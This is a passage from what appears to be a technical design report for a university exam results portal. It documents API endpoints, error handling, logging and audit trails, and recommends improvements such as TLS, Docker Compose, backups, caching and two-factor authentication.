  "access": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
  "refresh": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
  "user": {
    "id": 42,
    "username": "21001234",
    "role": "student",
    "branch": "CSE",
    "full_name": "Priya Sharma"
  }
}
```

### User/Profile Endpoints

| Method | Path           | Auth Required | Description                             |
|--------|----------------|---------------|-----------------------------------------|
| GET    | `/profile/`    | Yes           | Returns current user's details          |
| PUT    | `/profile/`    | Yes           | Update own profile (name, email)        |
| GET    | `/users/`      | Admin only    | List all users (filterable by branch)   |
| POST   | `/users/`      | Admin only    | Create new admin user                   |
| PATCH  | `/users/{id}/` | Admin only    | Update user permissions or deactivate  |
| DELETE | `/users/{id}/` | Admin only    | Delete user (soft-deactivate)           |

### Result Endpoints

| Method | Path                            | Auth Required | Description                          |
|--------|---------------------------------|---------------|--------------------------------------|
| GET    | `/results/`                     | Yes (student) | Own results, filterable by semester  |
| POST   | `/results/upload/`              | Admin only    | Upload Excel file with results       |
| DELETE | `/results/{id}/`                | Admin only    | Delete single result record          |
| DELETE | `/results/bulk-delete/`         | Admin only    | Delete results matching filters      |
| GET    | `/results/statistics/`          | Yes           | SGPA/CGPA/pass-fail stats            |
| GET    | `/results/admin-statistics/`    | Admin only    | Aggregate stats across all students  |

**GET `/results/`** query parameters:
- `semester` — filter by semester number (1–8)
- `exam_year` — filter by exam year
- `exam_month` — filter by exam month

**POST `/results/upload/`** — multipart form with `file` field containing `.xlsx`.
Returns:
```json
{
  "success": true,
  "records_processed": 450,
  "records_created": 200,
  "records_updated": 250,
  "errors": []
}
```

### Notification Endpoints

| Method | Path                       | Auth Required | Description                         |
|--------|----------------------------|---------------|-------------------------------------|
| GET    | `/notifications/`          | Yes           | Active notifications for user's role|
| POST   | `/notifications/`          | Admin only    | Create notification                 |
| PATCH  | `/notifications/{id}/`     | Admin only    | Update or deactivate notification   |
| DELETE | `/notifications/{id}/`     | Admin only    | Hard delete notification            |

### Circular Endpoints

| Method | Path                    | Auth Required | Description                    |
|--------|-------------------------|---------------|--------------------------------|
| GET    | `/circulars/`           | Yes           | List active circulars          |
| POST   | `/circulars/`           | Admin only    | Create circular                |
| PATCH  | `/circulars/{id}/`      | Admin only    | Update circular                |
| DELETE | `/circulars/{id}/`      | Admin only    | Delete circular                |

### Hall Ticket Endpoints

| Method | Path                                    | Auth Required | Description                              |
|--------|-----------------------------------------|---------------|------------------------------------------|
| GET    | `/hall-ticket-exams/`                   | Yes           | List hall ticket exam events             |
| POST   | `/hall-ticket-exams/`                   | Admin only    | Create exam event                        |
| POST   | `/hall-ticket-exams/{id}/subjects/`     | Admin only    | Add subjects to exam                     |
| POST   | `/hall-ticket-exams/{id}/enroll/`       | Admin only    | Upload enrollment Excel for exam         |
| POST   | `/hall-ticket-exams/{id}/generate/`     | Admin only    | Generate PDFs for all enrollments        |
| GET    | `/hall-ticket/download/{exam_id}/`      | Yes (student) | Download own hall ticket PDF             |
| POST   | `/hall-ticket/upload-photo/`            | Yes (student) | Upload passport photo                    |
| GET    | `/audit-logs/`                          | Admin only    | Paginated audit log with filters         |

### Health Check

| Method | Path           | Auth Required | Description               |
|--------|----------------|---------------|---------------------------|
| GET    | `/health/`     | No            | Returns 200 OK if running |

---

## 15. Error Handling Strategy

### 15.1 Backend Error Response Format

All API errors follow a consistent JSON structure:

```json
{
  "error": "Human-readable error message",
  "code": "ERROR_CODE",
  "details": { "field": "Additional context if applicable" }
}
```

This consistency allows the frontend to handle errors generically:

```javascript
try {
  const response = await api.post('/results/upload/', formData)
  setSuccess(true)
} catch (error) {
  const message = error.response?.data?.error || 'An unexpected error occurred'
  setErrorMessage(message)
}
```

The `?.` optional chaining handles cases where `error.response` is undefined
(network error, timeout) by falling back to the generic message.

### 15.2 HTTP Status Code Usage

| Status | Meaning                          | When Used in Portal                             |
|--------|----------------------------------|-------------------------------------------------|
| 200    | OK                               | Successful GET, PUT, PATCH                      |
| 201    | Created                          | Successful POST creating a resource             |
| 204    | No Content                       | Successful DELETE                               |
| 400    | Bad Request                      | Invalid input data, validation failure          |
| 401    | Unauthorized                     | Missing or invalid JWT token                    |
| 403    | Forbidden                        | Authenticated but lacks permission              |
| 404    | Not Found                        | Resource doesn't exist                          |
| 409    | Conflict                         | Duplicate registration, duplicate upload        |
| 429    | Too Many Requests                | Rate limit exceeded                             |
| 500    | Internal Server Error            | Unhandled server exception                      |
| 503    | Service Unavailable              | Database connection failure at startup          |

### 15.3 DRF Global Exception Handler

Django REST Framework provides a `EXCEPTION_HANDLER` setting for a custom
global exception handler:

```python
# settings.py
REST_FRAMEWORK = {
    'EXCEPTION_HANDLER': 'results.views.custom_exception_handler',
}

# views.py
from rest_framework.views import exception_handler

def custom_exception_handler(exc, context):
    response = exception_handler(exc, context)

    if response is not None:
        # Normalize all DRF errors to our standard format
        if isinstance(response.data, dict) and 'detail' in response.data:
            response.data = {'error': str(response.data['detail'])}
        elif isinstance(response.data, list):
            response.data = {'error': response.data[0]}

    return response
```

DRF's default behavior returns different structures for different errors
(e.g., `{'detail': 'Not found.'}` for 404, `{'username': ['This field is required.']}` 
for validation errors). The custom handler normalizes all these to the
`{'error': '...'}` format expected by the frontend.

### 15.4 Frontend Error Boundaries

React error boundaries catch JavaScript errors in the component tree and
display a fallback UI instead of crashing the entire application:

```jsx
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props)
    this.state = { hasError: false }
  }

  static getDerivedStateFromError(error) {
    return { hasError: true }
  }

  componentDidCatch(error, errorInfo) {
    console.error('Component error:', error, errorInfo)
  }

  render() {
    if (this.state.hasError) {
      return <div className="text-red-600">Something went wrong. Please refresh.</div>
    }
    return this.props.children
  }
}
```

Error boundaries only catch errors during rendering, not in event handlers or
async operations (those are caught by try/catch). The boundary is wrapped around
the dashboard components so that a crash in one widget doesn't take down the
entire page.

### 15.5 Excel Upload Error Handling

The `excel_handler.py` processes each row in a try/except block and collects
errors rather than aborting the entire upload on the first failure:

```python
errors = []
for row_num, row in enumerate(ws.iter_rows(min_row=2, values_only=True), start=2):
    try:
        roll_number, subject_name, grade, credits, semester = row[:5]
        if not roll_number or not subject_name:
            errors.append(f"Row {row_num}: Missing required fields")
            continue
        # ... process row
    except Exception as e:
        errors.append(f"Row {row_num}: {str(e)}")

return {
    'records_processed': processed,
    'records_created': created,
    'records_updated': updated,
    'errors': errors
}
```

This "collect and continue" approach is better for bulk operations than
"fail fast" — if 450 of 500 rows are valid, the admin can see which specific
rows failed and fix only those rather than re-uploading the entire file.

---

## 16. Logging and Monitoring

### 16.1 Dual Logging Architecture

The portal uses two separate log files with different severity thresholds:

```python
# settings.py
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '{asctime} [{levelname}] {name} {module}:{lineno} - {message}',
            'style': '{'
        },
    },
    'handlers': {
        'app_file': {
            'level': 'INFO',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': os.path.join(BASE_DIR, 'logs', 'app.log'),
            'maxBytes': 10 * 1024 * 1024,  # 10 MB
            'backupCount': 5,
            'formatter': 'verbose',
        },
        'security_file': {
            'level': 'WARNING',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': os.path.join(BASE_DIR, 'logs', 'security.log'),
            'maxBytes': 10 * 1024 * 1024,
            'formatter': 'verbose',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['app_file'],
            'level': 'INFO',
            'propagate': True,
        },
        'results.security': {
            'handlers': ['security_file', 'app_file'],
            'level': 'WARNING',
            'propagate': False,
        },
    },
}
```

**`RotatingFileHandler`** limits log file size. When `app.log` reaches 10 MB,
it is renamed to `app.log.1` and a new `app.log` is created. After `backupCount=5`
rotations, the oldest file (`app.log.5`) is deleted. This prevents disk space
exhaustion from unbounded log growth on a production server.

**Why separate security.log?**
Security events (failed logins, permission denials, lockouts) are high-value
events that security reviewers want to monitor without the noise of routine
application events (database queries, HTTP requests). A separate security log
with `WARNING` threshold ensures only meaningful security events appear there.

### 16.2 Security Event Logging

The `LoginAttemptMiddleware` logs security events:

```python
import logging
security_logger = logging.getLogger('results.security')

# On failed login:
security_logger.warning(
    f"Failed login for '{username}' from {ip_address}. "
    f"Attempt {user.failed_login_attempts}/5"
)

# On account lockout:
security_logger.warning(
    f"Account '{username}' locked from {ip_address} "
    f"after {user.failed_login_attempts} failed attempts"
)

# On successful login:
security_logger.info(
    f"Successful login for '{username}' from {ip_address}"
)
```

A security log entry looks like:
```
2024-12-15 14:30:22 [WARNING] results.security middleware:87 -
  Failed login for '21001234' from 192.168.1.100. Attempt 3/5
```

The timestamp, level, module name, line number, and message provide full context
for incident analysis.

### 16.3 Audit Log vs File Log Comparison

| Aspect              | File Log (app.log / security.log)        | Database Audit Log                    |
|---------------------|------------------------------------------|---------------------------------------|
| Storage             | Text files on filesystem                 | `audit_logs` table in MariaDB         |
| Queryability        | grep / tail / log analysis tools         | SQL queries, filterable by user/date  |
| Persistence         | Rotated, max 50 MB total                 | Unlimited (no auto-cleanup)           |
| Performance         | Very fast (file I/O)                     | Slower (DB write per event)           |
| Contents            | All events including Django internals    | Admin actions only                    |
| Access              | SSH to server required                   | Via admin dashboard in browser        |
| Use case            | Technical debugging, security monitoring | Admin accountability, compliance      |

The file log is for developers and sysadmins; the database audit log is for
institutional governance — showing what each admin did and when, accessible
to authorized staff through the web interface.

### 16.4 Admin Audit Log Events

Every significant admin action creates an `AuditLog` entry:

| Action                  | Severity | Example Details                               |
|-------------------------|----------|-----------------------------------------------|
| `RESULTS_UPLOADED`      | INFO     | "450 records processed, 200 created, 250 updated" |
| `RESULTS_DELETED`       | WARNING  | "Deleted 45 results for semester 3, CSE branch"   |
| `USER_CREATED`          | INFO     | "Created admin user jsmith with upload permission" |
| `USER_DEACTIVATED`      | WARNING  | "Deactivated user account 21001234"               |
| `PERMISSION_GRANTED`    | WARNING  | "Granted can_delete_results to jsmith"            |
| `HALL_TICKET_GENERATED` | INFO     | "Generated 120 hall tickets for exam Mid-2024"    |
| `LOGIN_LOCKOUT`         | CRITICAL | "Account 21001234 locked after 5 failed attempts" |

---

## 17. Future Enhancements and Recommendations

### 17.1 HTTPS / TLS Termination

**Current state:** The portal serves HTTP on ports 2026 and 8000. Traffic is
unencrypted. Credentials and tokens are transmitted in plaintext.

**Recommendation:** Add an Nginx reverse proxy container as a TLS termination
point. Use Let's Encrypt (Certbot) for free TLS certificates:

```yaml
# Addition to deployment:
spmvv_proxy:
  image: nginx:alpine
  ports:
    - "443:443"
    - "80:80"
  volumes:
    - ./nginx-tls.conf:/etc/nginx/conf.d/default.conf
    - /etc/letsencrypt:/etc/letsencrypt:ro
  depends_on:
    - spmvv_frontend
    - spmvv_backend
```

The reverse proxy handles TLS and forwards decrypted traffic to the internal
containers. Neither the frontend nor backend containers need changes.

### 17.2 Docker Compose Migration

**Current state:** The deployment script uses individual `docker run` commands,
which are long and error-prone.

**Recommendation:** Replace `deploy_docker.sh` with a `docker-compose.yml`:

```yaml
version: '3.8'
services:
  db:
    image: mariadb:10.11
    environment:
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
      MYSQL_DATABASE: spmvv_results
    volumes:
      - spmvv_mysql_data:/var/lib/mysql
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-u", "root", "-p${MYSQL_ROOT_PASSWORD}"]
      interval: 10s
      retries: 5

  backend:
    build: ./backend
    depends_on:
      db:
        condition: service_healthy
    environment:
      DB_HOST: db
      DJANGO_SECRET_KEY: ${DJANGO_SECRET_KEY}
    volumes:
      - ./backend/logs:/app/logs

  frontend:
    build: ./frontend
    ports:
      - "2026:2026"
    depends_on:
      - backend

volumes:
  spmvv_mysql_data:
```

`depends_on` with `condition: service_healthy` replaces the manual polling
loop in the current script. Docker Compose also handles network creation,
restart policies, and environment variable injection from a `.env` file.

### 17.3 Automated Database Backups (Cron)

**Current state:** Backups are only taken during redeployment.

**Recommendation:** Add a daily cron job for automated backups:

```bash
# /etc/cron.d/spmvv-backup
0 2 * * * root docker exec spmvv_db mysqldump -u root \
  -p"$MYSQL_ROOT_PASSWORD" spmvv_results > \
  /root/spmvv-exam-results/backups/daily_$(date +%Y%m%d).sql

# Cleanup backups older than 30 days
0 3 * * * root find /root/spmvv-exam-results/backups/ \
  -name "daily_*.sql" -mtime +30 -delete
```

### 17.4 Redis Cache Layer

**Current state:** Statistics are computed on every request from raw database
aggregations, which may be slow for large datasets.

**Recommendation:** Add Redis as a cache backend:

```python
# settings.py
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.redis.RedisCache',
        'LOCATION': 'redis://spmvv_redis:6379/1',
    }
}

# In statistics view:
from django.core.cache import cache

cache_key = f'stats_{request.user.id}_{semester}'
data = cache.get(cache_key)
if data is None:
    data = compute_statistics(request.user, semester)
    cache.set(cache_key, data, timeout=300)  # 5 minute cache
return Response(data)
```

Cache entries are invalidated when new results are uploaded. This reduces
database load for repeated statistics requests significantly.

### 17.5 Email Notifications

**Current state:** No email integration. Password reset requires admin intervention.

**Recommendation:** Integrate Django's email backend with an SMTP provider:

```python
# settings.py
EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'smtp.gmail.com'
EMAIL_PORT = 587
EMAIL_USE_TLS = True
EMAIL_HOST_USER = os.environ.get('EMAIL_USER')
EMAIL_HOST_PASSWORD = os.environ.get('EMAIL_PASSWORD')
```

Use cases: password reset tokens, registration confirmation, result upload
completion notification to admins, account lockout alerts.

### 17.6 Celery Async Task Queue

**Current state:** Hall ticket PDF generation and large Excel processing happen
synchronously in the HTTP request/response cycle. A large batch (500+ hall
tickets) could time out the request.

**Recommendation:** Add Celery with Redis as the message broker:

```python
# tasks.py
from celery import shared_task

@shared_task
def generate_hall_tickets_async(exam_id):
    exam = HallTicketExam.objects.get(id=exam_id)
    for enrollment in exam.enrollments.all():
        pdf_data = generate_hall_ticket_pdf(enrollment)
        HallTicket.objects.update_or_create(
            enrollment=enrollment,
            defaults={'pdf_data': pdf_data}
        )
    return f"Generated {exam.enrollments.count()} hall tickets"
```

The API endpoint starts the task and returns a task ID immediately. The
frontend polls a status endpoint until the task completes.

### 17.7 Pagination for All List Endpoints

**Current state:** Some list endpoints (results, users) may return all records
without pagination, which will be slow as data grows.

**Recommendation:** Apply DRF's `PageNumberPagination` globally:

```python
REST_FRAMEWORK = {
    'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.PageNumberPagination',
    'PAGE_SIZE': 50,
}
```

Clients receive `next` and `previous` URLs in the response for cursor-based
navigation. The frontend uses infinite scroll or explicit "next page" buttons.

### 17.8 API Versioning

**Current state:** All endpoints are under `/api/` with no version prefix.

**Recommendation:** Prefix endpoints with `/api/v1/` now, before external
integrations are built. Versioning allows introducing breaking changes in
`/api/v2/` while keeping `v1` stable for existing clients.

### 17.9 Frontend Test Coverage

**Current state:** No automated frontend tests.

**Recommendation:** Add Vitest (built into Vite's ecosystem) for unit tests and
React Testing Library for component tests:

```bash
npm install -D vitest @testing-library/react @testing-library/user-event
```

Priority test cases:
- `tokenManager.js` — setTokens/getTokens/clearTokens
- `useIdleTimeout.js` — timer fires after correct interval
- `ProtectedRoute.jsx` — redirects unauthenticated users
- SGPA calculation logic — edge cases (all F grades, no credits)

### 17.10 PostgreSQL Migration Path

**Current state:** MariaDB is the production database.

**Recommendation:** PostgreSQL offers advantages for analytical workloads:
- Window functions for CGPA trend analysis across multiple semesters
- Full-text search for student/subject lookup
- JSONB column type for flexible per-result metadata
- Better support for Django's ORM advanced features (ArrayField, etc.)

Migration path: dump with `mysqldump`, convert to PostgreSQL format with
`pgloader`, update `settings.py` to use `django.db.backends.postgresql`.
All ORM queries are portable since the portal uses no MySQL-specific SQL.

### 17.11 Container Health Checks

**Current state:** No Docker health checks are defined in the Dockerfiles.

**Recommendation:** Add `HEALTHCHECK` instructions:

```dockerfile
# backend/Dockerfile
HEALTHCHECK --interval=30s --timeout=10s --start-period=30s --retries=3 \
  CMD curl -f http://localhost:8000/api/health/ || exit 1
```

Health checks allow Docker to mark a container as "unhealthy" and restart it
automatically. They also enable `depends_on: condition: service_healthy`
in Docker Compose for proper startup ordering.

### 17.12 Object Storage for Binary Files

**Current state:** Student photos and hall ticket PDFs are stored as BinaryField
in MariaDB, which increases database size and query time.

**Recommendation:** Move binary assets to object storage (MinIO for self-hosted,
or S3 for cloud). Store only the URL/key in the database:

```python
class HallTicketStudentPhoto(models.Model):
    student = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    photo_key = models.CharField(max_length=200)  # S3/MinIO object key
    uploaded_at = models.DateTimeField(auto_now_add=True)
```

This reduces database size, improves query performance on non-binary fields,
and enables CDN-based delivery of assets.

### 17.13 Structured Logging (JSON Format)

**Current state:** Log lines are human-readable text format.

**Recommendation:** Switch to JSON-structured logging for machine-parseable
log ingestion by tools like Elasticsearch, Grafana Loki, or Splunk:

```python
'formatters': {
    'json': {
        '()': 'pythonjsonlogger.jsonlogger.JsonFormatter',
        'format': '%(asctime)s %(levelname)s %(name)s %(message)s',
    },
},
```

Each log entry becomes a JSON object, enabling powerful filtering queries:
`jq 'select(.levelname=="WARNING" and .name=="results.security")'`.

### 17.14 Two-Factor Authentication (2FA)

**Current state:** Authentication is username + password only.

**Recommendation:** Add TOTP (Time-based One-Time Password) 2FA for admin
accounts using `django-otp`:

```python
# After successful password verification:
if user.role == 'admin' and user.totp_enabled:
    # Return partial auth token that requires TOTP verification
    return Response({'require_2fa': True, 'partial_token': partial_jwt})
```

Admin accounts with access to bulk operations and user management represent
a high-value target. 2FA significantly raises the bar for account takeover.

### 17.15 Audit Log Retention Policy

**Current state:** The `audit_logs` table grows without bound.

**Recommendation:** Implement a periodic cleanup task that archives logs older
than 2 years to compressed CSV files and deletes them from the database:

```python
# management/commands/archive_audit_logs.py
from django.core.management.base import BaseCommand
from django.utils import timezone
from datetime import timedelta

class Command(BaseCommand):
    def handle(self, *args, **options):
        cutoff = timezone.now() - timedelta(days=730)
        old_logs = AuditLog.objects.filter(timestamp__lt=cutoff)
        # Export to CSV, then delete
        old_logs.delete()
```

This prevents the `audit_logs` table from consuming unlimited storage while
preserving a legally/institutionally required archive in compressed form.

---

*End of Technical Report — SPMVV Exam Results Portal*

*Generated: 2025 | Version: 2.0*
*Total Coverage: 17 Sections | Django 5.0.9 + React 18.2.0 + MariaDB 10.11*
